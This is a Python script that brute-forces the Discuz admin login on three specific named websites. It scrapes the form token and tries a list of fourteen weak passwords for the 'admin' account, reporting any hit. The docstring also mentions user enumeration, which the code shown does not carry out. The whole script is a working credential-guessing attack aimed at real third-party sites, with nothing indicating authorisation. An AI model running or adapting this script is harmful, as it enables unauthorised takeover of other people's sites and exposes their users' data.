#!/usr/bin/env python3
"""Discuz admin weak brute on 3 sites + member.php user enum"""
import urllib.request, urllib.parse, re, http.cookiejar, time

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "*/*"}
SITES = ["http://www.lk0355.com", "http://www.dealabc.com", "http://www.turksincanada.com"]

def get_opener():
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))

def fetch(op, url, timeout=10, data=None, referer=None):
    h = {**UA}
    if data: h["Content-Type"] = "application/x-www-form-urlencoded"
    if referer: h["Referer"] = referer
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None, headers=h)
        r = op.open(req, timeout=timeout)
        return r.status, r.geturl(), r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, url, e.read(5000).decode("utf-8", "ignore")
    except Exception as ex:
        return 0, url, str(ex)

PWS = ["admin", "admin123", "123456", "admin888", "12345678", "admin@123", "admin123456",
       "a123456", "password", "888888", "admin666", "Aa123456", "123456789", "admin000"]

for site in SITES:
    print("=== %s ===" % site, flush=True)
    op = get_opener()
    code, final, body = fetch(op, site + "/admin.php")
    # Discuz X3.5 admin login form
    m = re.search(r'name="formhash" value="([a-f0-9]+)"', body) or re.search(r'formhash=([a-f0-9]+)', body)
    fh = m.group(1) if m else ""
    has_login = "username" in body.lower() or "password" in body.lower()
    print("  admin.php: code=%s formhash=%s login=%s" % (code, fh[:10], has_login), flush=True)
    if not has_login:
        continue
    for pw in PWS:
        data = urllib.parse.urlencode({"username": "admin", "password": pw, "formhash": fh, "submit": "登录"})
        code, final, body = fetch(op, site + "/admin.php?action=login", data=data,
                                  referer=site + "/admin.php")
        ok = "退出" in body or "admincp" in final or ("action=logout" in body)
        if ok:
            print("  !!! admin/%s HIT" % pw, flush=True)
            break
        if code == 302:
            print("  302 -> %s" % final[:60], flush=True)
        time.sleep(0.5)
    else:
        print("  no hit", flush=True)
